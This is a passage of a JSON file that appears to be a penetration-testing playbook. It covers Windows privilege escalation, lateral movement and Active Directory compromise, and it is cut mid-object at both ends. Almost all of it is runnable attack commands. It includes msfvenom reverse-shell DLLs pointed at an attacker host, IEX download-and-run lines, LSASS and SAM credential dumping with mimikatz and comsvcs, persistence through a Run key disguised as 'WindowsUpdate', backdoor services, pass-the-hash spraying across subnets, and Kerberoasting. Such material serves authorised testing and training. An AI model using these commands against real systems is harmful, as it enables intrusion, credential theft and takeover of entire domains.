        "code": "# ─── Find missing DLLs via Process Monitor ───\n# Filter: Process Name | Operation = CreateFile | Result = NAME NOT FOUND\n# Filter: Path ends with .dll\n# Look for DLLs loaded from writable dirs (user %TEMP%, current dir, etc.)\n\n# ─── DLL Search Order (Windows default) ───\n# 1. KnownDLLs registry (HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs)\n# 2. Application directory\n# 3. System directory (%SystemRoot%\\System32)\n# 4. %SystemRoot%\\System\n# 5. %SystemRoot%\n# 6. Current working directory\n# 7. PATH directories (left to right)\n\n# ─── Find writable directories in PATH ───\nforeach ($p in $env:Path.Split(\";\")) {\n  if (Test-Path $p) {\n    $acl = Get-Acl $p -ErrorAction SilentlyContinue\n    if ($acl) { Write-Output \"$p : $($acl.AccessToString)\" }\n  }\n}\n\n# ─── Seatbelt DLL path check ───\n.\\Seatbelt.exe ProcessDLLHijack\n\n# ─── PowerUp ───\nFind-PathDLLHijack\nFind-ProcessDLLHijack\n\n# ─── Generate malicious DLL (msfvenom) ───\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o <MISSING_DLL_NAME>.dll\nmsfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o <MISSING_DLL_NAME>.dll\n\n# ─── C template for DLL ───\n# Compile on Kali: x86_64-w64-mingw32-gcc -shared -o <NAME>.dll malicious.c\n<# malicious.c:\n#include <windows.h>\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {\n    if (fdwReason == DLL_PROCESS_ATTACH) {\n        system(\"cmd /c C:\\\\Windows\\\\Temp\\\\rev.exe\");\n    }\n    return TRUE;\n}\n#>\n\nx86_64-w64-mingw32-gcc -shared -o evil.dll evil.c -lws2_32\n\n# ─── Place DLL and trigger ───\ncopy C:\\Windows\\Temp\\<MISSING_DLL_NAME>.dll \"<WRITABLE_PATH>\\<MISSING_DLL_NAME>.dll\"\n# Restart service or wait for it to restart automatically"
      }
    ],
    "brief_description": "Use Procmon to find NAME NOT FOUND DLLs in writable paths. Compile replacement DLL and plant in the searched directory."
  },
  {
    "id": "item-winpe-7",
    "phase": "9. Privilege Escalation — Windows",
    "step": "9.7 Registry Exploits and AutoRuns",
    "title": "Exploit writable registry autorun keys and service entries",
    "feasible_when": "Autorun registry keys or service ImagePath registry entries are writable by the current user.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# ─── Check AutoRun registry keys ───\nGet-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'\nGet-ItemProperty 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'\nGet-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce'\nGet-ItemProperty 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce'\nreg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'\n\n# ─── Check permissions on autorun keys ───\nGet-ACL 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' | Format-List\n.\\accesschk.exe /accepteula -wvuk 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'\n\n# ─── Exploit writable AutoRun ───\n# If current user can write to Run key:\nreg add 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' /v 'WindowsUpdate' /t REG_SZ /d 'C:\\Windows\\Temp\\rev.exe' /f\n# Triggers on next user login\n\n# ─── Autoruns.exe (Sysinternals) — comprehensive autorun audit ───\n.\\Autoruns.exe  # GUI — look for non-Microsoft entries\n.\\autorunsc.exe -a *  # CLI\n.\\autorunsc.exe -a * -c | Out-File autoruns.csv  # export CSV\n\n# ─── Writable binary paths from autoruns ───\n# For each autorun entry, check binary path permissions:\nicacls 'C:\\path\\to\\autorun_binary.exe'\n\n# ─── PowerUp autorun check ───\nGet-ModifiableRegistryAutoRun\n\n# ─── MSI repair trick (Windows Installer) ───\n# If an MSI is in autorun and you have write access:\n# Replace or modify MSI — runs on next repair/reboot"
      }
    ],
    "brief_description": "Writable AutoRun registry keys persist payloads across reboots. Use Autoruns.exe to find third-party entries with weak permissions."
  },
  {
    "id": "item-winpe-8",
    "phase": "9. Privilege Escalation — Windows",
    "step": "9.8 SAM / SYSTEM / Credential Dumping",
    "title": "Extract SAM hashes and exploit saved credentials",
    "feasible_when": "SAM/SYSTEM backup files exist in readable locations, or an admin shell is available for live registry export.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# ─── SAM backup file locations ───\ndir C:\\Windows\\Repair\\SAM 2>$null\ndir C:\\Windows\\Repair\\SYSTEM 2>$null\ndir C:\\Windows\\System32\\config\\RegBack\\SAM 2>$null\ndir C:\\Windows\\System32\\config\\RegBack\\SYSTEM 2>$null\ndir C:\\Windows\\System32\\config\\RegBack\\SECURITY 2>$null\ndir C:\\Windows\\Temp\\*.hiv 2>$null\n\n# ─── Live registry export (requires admin) ───\nreg save HKLM\\SAM C:\\Windows\\Temp\\SAM.hiv\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM.hiv\nreg save HKLM\\SECURITY C:\\Windows\\Temp\\SECURITY.hiv\n\n# ─── Transfer to attacker and parse ───\n# On attacker:\nimpacket-secretsdump -sam SAM.hiv -system SYSTEM.hiv -security SECURITY.hiv LOCAL\nsamdump2 SYSTEM.hiv SAM.hiv\n\n# ─── Saved credentials ───\ncmdkey /list\n# If saved creds exist:\nrunas /savecred /user:<DOMAIN>\\<USER> \"cmd /c C:\\Windows\\Temp\\rev.exe\"\nrunas /savecred /user:<LOCAL_USER> \"cmd.exe\"\n\n# ─── Credential Manager ───\n[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]::new().RetrieveAll() | % { $_.RetrievePassword(); $_ }\n\n# ─── Scheduled task using stored creds ───\nschtasks /query /fo LIST /v | findstr /i 'task name\\|run as user'\nschtasks /run /tn '<TASK_NAME>'\n\n# ─── Mimikatz from admin shell ───\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n.\\mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\"\n.\\mimikatz.exe \"token::elevate\" \"lsadump::sam\" \"exit\"\n\n# ─── LSASS dump without mimikatz ───\n# comsvcs.dll MiniDump\nGet-Process lsass\nrundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\Windows\\Temp\\lsass.dmp full\n# Parse on attacker:\npypykatz lsa minidump lsass.dmp\nimpacket-secretsdump -system SYSTEM.hiv -security SECURITY.hiv -ntds ntds.dit LOCAL"
      }
    ],
    "brief_description": "SAM backup files in C:\\Windows\\Repair are frequently readable without admin. Parse with secretsdump to recover NTLM hashes."
  },
  {
    "id": "item-winpe-9",
    "phase": "9. Privilege Escalation — Windows",
    "step": "9.9 Token Manipulation and Impersonation",
    "title": "Token manipulation with available privileges",
    "feasible_when": "`whoami /priv` shows `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, or similar elevated privileges.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# ─── Token privilege check ───\nwhoami /priv\n# Key privileges:\n# SeDebugPrivilege           → LSASS dump, inject into any process\n# SeBackupPrivilege          → read any file (even protected)\n# SeRestorePrivilege         → write any file\n# SeTakeOwnershipPrivilege   → take ownership of any object\n# SeLoadDriverPrivilege      → load malicious kernel driver\n# SeCreateSymbolicLinkPriv.  → create symlinks\n# SeChangeNotifyPrivilege    → cross directory without read access\n# SeShutdownPrivilege        → shutdown/reboot\n# SeSyncAgentPrivilege       → DCSync (if on DC)\n\n# ─── SeDebugPrivilege → LSASS dump ───\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords full\" \"exit\"\n\n# Inject into SYSTEM process (e.g., winlogon.exe)\nGet-Process winlogon\n# Inject reverse shell shellcode into PID\n\n# ─── SeBackupPrivilege → read SAM/SYSTEM ───\n# Using reg.exe or wbadmin or diskshadow\nreg save HKLM\\SAM C:\\Windows\\Temp\\SAM.hiv\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM.hiv\n# Or use https://github.com/giuliano108/SeBackupPrivilege\n\n# ─── SeRestorePrivilege → write anywhere ───\n# Write to SAM and SYSTEM\n# Overwrite service binary path as SYSTEM\n# https://github.com/giuliano108/SeBackupPrivilege (RestorePrivilege module)\n\n# ─── SeTakeOwnershipPrivilege → own SYSTEM files ───\ntakeown /f C:\\Windows\\System32\\cmd.exe\nicacls C:\\Windows\\System32\\cmd.exe /grant '<USER>:F'\n# Now replace cmd.exe with payload (DANGEROUS — backup first!)\n\n# ─── SeLoadDriverPrivilege → kernel exploit ───\n# Load Capcom.sys or vulnerable driver to gain kernel code execution\n# https://github.com/TarlogicSecurity/EoPLoadDriver/\n\n# ─── Rubeus (token manipulation) ───\n.\\Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /show\n.\\Rubeus.exe tgtdeleg /nowrap\n.\\Rubeus.exe asktgt /user:administrator /certificate:<PFX_BASE64> /ptt\n\n# ─── Enabling disabled privileges ───\n# PowerShell function to enable privileges:\nAdd-Type @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class TokenManipulator {\n  [DllImport(\"advapi32.dll\", ExactSpelling = true, SetLastError = true)]\n  internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);\n  // ... (use PowerSploit's Enable-Privilege)\n}\n\"@\nIEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Enable-Privilege.ps1')\nEnable-Privilege SeDebugPrivilege"
      }
    ],
    "brief_description": "SeBackupPrivilege reads SAM/SYSTEM. SeDebugPrivilege dumps LSASS. Check all privileges — even 'disabled' ones can be enabled."
  },
  {
    "id": "item-winpe-10",
    "phase": "9. Privilege Escalation — Windows",
    "step": "9.10 PrintNightmare and Kernel Exploits",
    "title": "PrintNightmare (CVE-2021-1675) and Windows kernel exploits",
    "feasible_when": "Print Spooler service is running (PrintNightmare) or OS version/patch level matches known kernel CVEs.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# ─── Check Print Spooler service ───\nGet-Service -Name Spooler\nsc query Spooler\nGet-CimInstance -ClassName Win32_Service -Filter \"Name='Spooler'\"\n\n# ─── PrintNightmare remote (CVE-2021-1675) ───\n# On attacker — host malicious DLL\npython3 -m http.server 80\n# OR: impacket-smbserver share . -smb2support\npython3 CVE-2021-1675.py '<DOMAIN>/<USER>:<PASS>@<TARGET_IP>' '\\\\\\\\<ATTACKER_IP>\\\\share\\\\evil.dll'\n\n# ─── PrintNightmare local (CVE-2021-1675) ───\nImport-Module .\\CVE-2021-1675.ps1\nInvoke-Nightmare -DLL 'C:\\Windows\\Temp\\evil.dll'\nInvoke-Nightmare -NewUser 'hacker' -NewPassword 'Password123!'\n\n# ─── Generate malicious DLL for PrintNightmare ───\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o evil.dll\n\n# ─── Windows kernel exploit history ───\n# Check OS version: systeminfo | findstr 'OS Name\\|OS Version'\n# Check patches: wmic qfe list | findstr 'KB'\n\n# MS15-051 (Win 7/8/2008/2012 < May 2015)\n# MS16-032 (Win 7-10, Server 2008-2012 — Secondary Logon)\nIEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/MS16-032.ps1')\nInvoke-MS16032 -Application cmd.exe -commandline '/c net user hacker Password123! /add'\n\n# MS16-135 (Win 10 1511 — win32k)\n# CVE-2019-0841 (Win 10 1903 — DACL manipulation)\n# CVE-2021-36934 HiveNightmare / SeriousSAM (Win 10 builds before Oct 2021)\n# VSS shadow copy SAM leak:\nvssadmin list shadows\n# If shadow exists:\ncopy '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM' C:\\Windows\\Temp\\SAM\ncopy '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM' C:\\Windows\\Temp\\SYSTEM\n\n# ─── Windows Exploit Suggester ───\n# On attacker:\npython3 windows-exploit-suggester.py --update\npython3 windows-exploit-suggester.py --database <DB>.xlsx --systeminfo systeminfo.txt\n\n# Seatbelt Hotfixes\n.\\Seatbelt.exe WindowsHotFixes"
      }
    ],
    "brief_description": "PrintNightmare works on Server 2019 with Spooler running. HiveNightmare leaks SAM without admin on unpatched Win 10."
  },

  // ============================================================
  // PHASE 10 — LATERAL MOVEMENT
  // ============================================================
  {
    "id": "item-lat-1",
    "phase": "10. Lateral Movement",
    "step": "10.1 Pass-the-Hash",
    "title": "Pass-the-Hash (PtH) — authenticate with NTLM hash without cracking",
    "feasible_when": "An NTLM hash has been obtained and the target has port 445 (SMB), 5985 (WinRM), or 3389 (RDP) open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── impacket suite ───\nimpacket-psexec -hashes :<NTLM_HASH> administrator@<TARGET_IP>\nimpacket-psexec -hashes <LM_HASH>:<NTLM_HASH> administrator@<TARGET_IP>\nimpacket-psexec <DOMAIN>/administrator@<TARGET_IP> -hashes :<NTLM_HASH>\nimpacket-wmiexec -hashes :<NTLM_HASH> administrator@<TARGET_IP>\nimpacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/administrator@<TARGET_IP>\nimpacket-smbexec -hashes :<NTLM_HASH> administrator@<TARGET_IP>\nimpacket-atexec -hashes :<NTLM_HASH> administrator@<TARGET_IP> 'whoami'\nimpacket-dcomexec -hashes :<NTLM_HASH> administrator@<TARGET_IP>\n\n# ─── CrackMapExec (spray entire subnet) ───\ncrackmapexec smb <TARGET_IP> -u administrator -H <NTLM_HASH>\ncrackmapexec smb <NETWORK_CIDR> -u administrator -H <NTLM_HASH>\ncrackmapexec smb <NETWORK_CIDR> -u administrator -H <NTLM_HASH> --local-auth\ncrackmapexec smb <TARGET_IP> -u administrator -H <NTLM_HASH> -x 'whoami'\ncrackmapexec smb <TARGET_IP> -u administrator -H <NTLM_HASH> -X 'Get-Process'\ncrackmapexec smb <TARGET_IP> -u administrator -H <NTLM_HASH> --sam   # dump SAM\ncrackmapexec smb <TARGET_IP> -u administrator -H <NTLM_HASH> --lsa   # dump LSA\ncrackmapexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH> --loggedon-users\n\n# ─── evil-winrm (WinRM PtH) ───\nevil-winrm -i <TARGET_IP> -u administrator -H <NTLM_HASH>\nevil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>\n\n# ─── xfreerdp (RDP PtH — requires Restricted Admin mode) ───\n# First enable Restricted Admin mode on target if you have admin access:\nreg add 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f\n# Then PtH via RDP:\nxfreerdp /v:<TARGET_IP> /u:administrator /pth:<NTLM_HASH> /cert:ignore /d:<DOMAIN>\n\n# ─── Metasploit ───\nmsf: use exploit/windows/smb/psexec\nset SMBUser administrator\nset SMBPass <LM_HASH>:<NTLM_HASH>\nset RHOSTS <TARGET_IP>\nrun\n\n# ─── With specific domain account ───\nimpacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>\ncrackmapexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH> -d <DOMAIN>"
      }
    ],
    "brief_description": "NTLM hashes can be used directly without cracking. Always spray across the subnet — password reuse between systems is very common."
  },
  {
    "id": "item-lat-2",
    "phase": "10. Lateral Movement",
    "step": "10.2 Pass-the-Ticket and Overpass-the-Hash",
    "title": "Pass Kerberos tickets and overpass NTLM to Kerberos",
    "feasible_when": "A Kerberos ticket (.ccache or .kirbi) has been extracted from LSASS or obtained via AS-REP/TGS requests.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Pass-the-Ticket (Linux — ccache) ───\nexport KRB5CCNAME=/tmp/ticket.ccache\nkin -t /tmp/ticket.ccache  # import\nklist  # verify ticket is loaded\n\n# Use ticket for impacket tools\nimpacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>\nimpacket-wmiexec -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>\nimpacket-smbclient -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>\nimpacket-secretsdump -k -no-pass <DOMAIN>/administrator@dc01.<DOMAIN>\n\n# ─── Overpass-the-Hash (NTLM → Kerberos TGT) ───\nimpacket-getTGT <DOMAIN>/<USER> -hashes :<NTLM_HASH> -dc-ip <DC_IP>\nimpacket-getTGT <DOMAIN>/<USER> -password <PASS> -dc-ip <DC_IP>\nexport KRB5CCNAME=<USER>.ccache\nimpacket-psexec -k -no-pass <DOMAIN>/<USER>@dc01.<DOMAIN>\n\n# ─── Request specific service ticket ───\nimpacket-getST -spn CIFS/<TARGET_FQDN> <DOMAIN>/<USER>:<PASS>\nimpacket-getST -spn HTTP/<TARGET_FQDN> <DOMAIN>/<USER>:<PASS>\n\n# ─── Pass-the-Ticket (Windows — kirbi) ───\n# Rubeus import\n.\\Rubeus.exe ptt /ticket:<BASE64_TICKET>\n.\\Rubeus.exe ptt /ticket:ticket.kirbi\nklist  # verify\n# Use standard Windows tools — tickets are in memory\ndir \\\\<TARGET>\\C$\n\n# ─── Overpass-the-Hash (Windows — Rubeus) ───\n.\\Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /ptt\n.\\Rubeus.exe asktgt /user:<USER> /aes256:<AES256_HASH> /ptt   # stealthier\n.\\Rubeus.exe tgtdeleg /nowrap   # get usable TGT as current user\n\n# ─── Extract tickets from LSASS ───\n.\\Rubeus.exe dump /nowrap        # all tickets\n.\\Rubeus.exe dump /service:krbtgt /nowrap  # only TGTs\n.\\Rubeus.exe monitor /interval:5 /nowrap   # watch for new tickets (useful on unconstrained hosts)\n\n# ─── Mimikatz ticket extraction ───\n.\\mimikatz.exe \"sekurlsa::tickets /export\" \"exit\"\n# Exports .kirbi files — inject with:\n.\\mimikatz.exe \"kerberos::ptt ticket.kirbi\" \"exit\""
      }
    ],
    "brief_description": "Overpass-the-Hash converts NTLM to a Kerberos TGT — more stealthy than PtH. Rubeus monitor catches tickets on unconstrained hosts."
  },
  {
    "id": "item-lat-3",
    "phase": "10. Lateral Movement",
    "step": "10.3 Remote Code Execution — Multiple Methods",
    "title": "Execute commands on remote Windows hosts via multiple vectors",
    "feasible_when": "Valid credentials or NTLM hashes are available and the target has SMB (445), RPC (135), WinRM (5985), or SSH (22) open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── impacket suite (choose based on AV/EDR) ───\n# psexec — noisy, creates new service, often caught by AV\nimpacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>\nimpacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>\n\n# smbexec — less noisy, also service-based\nimpacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>\n\n# wmiexec — stealthiest, no service, uses WMI\nimpacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>\nimpacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP> 'cmd /c whoami'\nimpacket-wmiexec -silentcommand <DOMAIN>/<USER>:<PASS>@<TARGET_IP> 'whoami'\n\n# atexec — uses Windows Task Scheduler\nimpacket-atexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP> 'whoami'\n\n# dcomexec — uses DCOM objects\nimpacket-dcomexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>\nimpacket-dcomexec -object MMC20 <DOMAIN>/<USER>:<PASS>@<TARGET_IP> 'whoami'\nimpacket-dcomexec -object ShellWindows <DOMAIN>/<USER>:<PASS>@<TARGET_IP>\nimpacket-dcomexec -object ShellBrowserWindow <DOMAIN>/<USER>:<PASS>@<TARGET_IP>\n\n# ─── CrackMapExec ───\ncrackmapexec smb <TARGET_IP> -u <USER> -p <PASS> -x 'cmd_here'     # CMD\ncrackmapexec smb <TARGET_IP> -u <USER> -p <PASS> -X 'ps_cmd_here'  # PowerShell\ncrackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --exec-method smbexec -x 'whoami'\ncrackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --exec-method wmiexec -x 'whoami'\ncrackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --exec-method mmcexec -x 'whoami'\ncrackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --exec-method atexec -x 'whoami'\n\n# ─── evil-winrm ───\nevil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'\nevil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>\nevil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -s /opt/ps_scripts/ -e /opt/exes/\nevil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -S   # HTTPS (5986)\n\n# ─── SSH (if enabled) ───\nssh <USER>@<TARGET_IP>\nssh -i id_rsa <USER>@<TARGET_IP>\n\n# ─── WMI via cmd (Windows only) ───\nwmic /node:<TARGET_IP> /user:<USER> /password:<PASS> process call create 'cmd.exe /c whoami > C:\\tmp\\out.txt'\n\n# ─── Invoke-Command (PS remoting) ───\n$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\\<USER>', (ConvertTo-SecureString '<PASS>' -AsPlainText -Force))\nInvoke-Command -ComputerName <TARGET_IP> -Credential $cred -ScriptBlock { whoami }\nEnter-PSSession -ComputerName <TARGET_IP> -Credential $cred\n\n# ─── SC (service-based RCE) ───\nsc \\\\<TARGET_IP> create backdoor binPath= 'cmd /c C:\\Windows\\Temp\\rev.exe' start= auto\nsc \\\\<TARGET_IP> start backdoor\nsc \\\\<TARGET_IP> delete backdoor"
      }
    ],
    "brief_description": "Use wmiexec or dcomexec when psexec is blocked by AV. Try multiple execution methods — different EDRs block different ones."
  },

  // ============================================================
  // PHASE 11 — ACTIVE DIRECTORY & DOMAIN COMPROMISE
  // ============================================================
  {
    "id": "item-ad-1",
    "phase": "11. Active Directory & Domain Compromise",
    "step": "11.1 AD Enumeration",
    "title": "Comprehensive domain enumeration with BloodHound, CME, and PowerView",
    "feasible_when": "Valid domain credentials are available and port 445 or 389 is accessible on a Domain Controller.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── CrackMapExec (initial AD recon) ───\ncrackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>'\ncrackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' --users\ncrackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' --groups\ncrackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' --computers\ncrackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' --pass-pol\ncrackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' --loggedon-users\ncrackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' --local-groups\ncrackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' --shares\ncrackmapexec smb <NETWORK_CIDR> -u <USER> -p '<PASS>' --gen-relay-list relay.txt\n\n# ─── BloodHound Python (from Kali) ───\nbloodhound-python -c All -u <USER> -p '<PASS>' -d <DOMAIN> -ns <DC_IP> -o ./bloodhound/\nbloodhound-python -c All -u <USER> -p '<PASS>' -d <DOMAIN> -dc <DC_FQDN> --zip\nbloodhound-python -c DCOnly -u <USER> -p '<PASS>' -d <DOMAIN> -ns <DC_IP>  # stealthy, DC only\nbloodhound-python -c All,LoggedOn -u <USER> -p '<PASS>' -d <DOMAIN> -ns <DC_IP>\n# Upload resulting .json files to BloodHound GUI\n\n# ─── BloodHound analysis queries ───\n# Shortest Paths to Domain Admins\n# Shortest Paths to High Value Targets\n# Principles with DCSync Rights\n# Computers with Unconstrained Delegation\n# All Domain Admins\n# Find AS-REP Roastable Users\n# Find Kerberoastable Users\n\n# ─── ldapdomaindump ───\nldapdomaindump -u '<DOMAIN>\\<USER>' -p '<PASS>' <DC_IP> -o ./ldap/\n# View: domain_computers.html, domain_users.html, domain_groups.html, domain_trusts.html\n\n# ─── windapsearch ───\nwindapsearch --dc <DC_IP> -u '<USER>@<DOMAIN>' -p '<PASS>' --users --full\nwindapsearch --dc <DC_IP> -u '<USER>@<DOMAIN>' -p '<PASS>' --groups\nwindapsearch --dc <DC_IP> -u '<USER>@<DOMAIN>' -p '<PASS>' --da         # domain admins\nwindapsearch --dc <DC_IP> -u '<USER>@<DOMAIN>' -p '<PASS>' --privileged-users\nwindapsearch --dc <DC_IP> -u '<USER>@<DOMAIN>' -p '<PASS>' --computers\n\n# ─── rpcclient enumeration ───\nrpcclient -U '<USER>%<PASS>' <DC_IP>\n  enumdomusers\n  enumdomgroups\n  enumprinters\n  querygroupmem 0x<GROUP_RID>\n  queryuser 0x1f4    # Administrator (RID 500)\n  getdompwinfo\n  enumprivs"
      },
      {
        "lang": "powershell",
        "code": "# ─── SharpHound (from Windows target) ───\n.\\SharpHound.exe -c All --domain <DOMAIN>\n.\\SharpHound.exe -c All,GPOLocalGroup --domain <DOMAIN>\n.\\SharpHound.exe -c DCOnly --domain <DOMAIN>    # stealthy\n.\\SharpHound.exe -c All --stealth               # reduced noise\n.\\SharpHound.exe -c All --outputdirectory C:\\Windows\\Temp\\\n# In-memory via PS:\nIEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/SharpHound.ps1')\nInvoke-BloodHound -CollectionMethod All -Domain <DOMAIN>\n\n# ─── PowerView (comprehensive LDAP-based enum) ───\nImport-Module .\\PowerView.ps1\n# OR in-memory:\nIEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerView.ps1')\n\n# Users\nGet-DomainUser | Select-Object samaccountname,description,memberof,pwdlastset,lastlogon\nGet-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname    # Kerberoastable\nGet-DomainUser -UACFilter NOT_PREAUTH | Select-Object samaccountname       # AS-REP Roastable\nGet-DomainUser -Properties samaccountname,description | Where-Object {$_.description -ne $null}\n\n# Groups\nGet-DomainGroup 'Domain Admins' | Select-Object member\nGet-DomainGroup 'Enterprise Admins' | Select-Object member\nGet-DomainGroupMember 'Domain Admins' -Recurse\nGet-DomainGroupMember 'Backup Operators' | Select-Object MemberName\n\n# Computers\nGet-DomainComputer | Select-Object dnshostname,operatingsystem,lastlogondate\nGet-DomainComputer -Unconstrained | Select-Object dnshostname    # unconstrained delegation\nGet-DomainComputer -TrustedToAuth | Select-Object dnshostname    # constrained delegation\n\n# GPOs and OU\nGet-DomainGPO | Select-Object displayname,gpcfilesyspath\nGet-DomainOU | Select-Object name,distinguishedname\n\n# Trusts\nGet-DomainTrust\nGet-ForestTrust\nGet-DomainTrustMapping\n\n# Local admin access\nFind-LocalAdminAccess   # find where current user is local admin\nFind-DomainLocalGroupMember -GroupName 'Administrators'\n\n# Shares\nFind-DomainShare -CheckShareAccess\nFind-InterestingDomainShareFile -Include @('*pass*','*cred*','*.kdbx','*.config')\n\n# ACLs\nFind-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match '<USER>'}"
      }
    ],
    "brief_description": "Run BloodHound immediately with any domain credential. PowerView finds local admin paths, ACL abuse chains, and sensitive shares."
  },
  {
    "id": "item-ad-2",
    "phase": "11. Active Directory & Domain Compromise",
    "step": "11.2 Kerberoasting",
    "title": "Request and crack TGS service tickets for SPN-enabled accounts",
    "feasible_when": "Any valid domain credential is available and Service Principal Names (SPNs) exist in the domain.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Find SPNs ───\nimpacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>\nimpacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request\nimpacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile kerberoast.txt\nimpacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request-user <TARGET_USER>\nimpacket-GetUserSPNs <DOMAIN>/<USER>@<DOMAIN> -dc-ip <DC_IP> -k -no-pass -request  # with ticket\n\n# ─── Crack with hashcat ───\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force\njohn --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt"
      },
      {
        "lang": "powershell",
        "code": "# ─── Rubeus (from Windows target) ───\n.\\Rubeus.exe kerberoast /outfile:kerberoast.txt\n.\\Rubeus.exe kerberoast /user:<TARGET_USER> /outfile:kerberoast.txt\n.\\Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt\n.\\Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast.txt     # request RC4 only (less noisy)\n.\\Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast.txt     # use TGT delegation\n\n# ─── PowerView request ───\nGet-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname\nRequest-SPNTicket -SPN '<SPN_STRING>' -Format Hashcat\n\n# ─── After cracking: use credentials ───\nimpacket-psexec <DOMAIN>/<SVC_ACCOUNT>:<CRACKED_PASS>@<TARGET_IP>\ncrackmapexec smb <TARGET_IP> -u <SVC_ACCOUNT> -p '<CRACKED_PASS>' -d <DOMAIN>"
      }
    ],
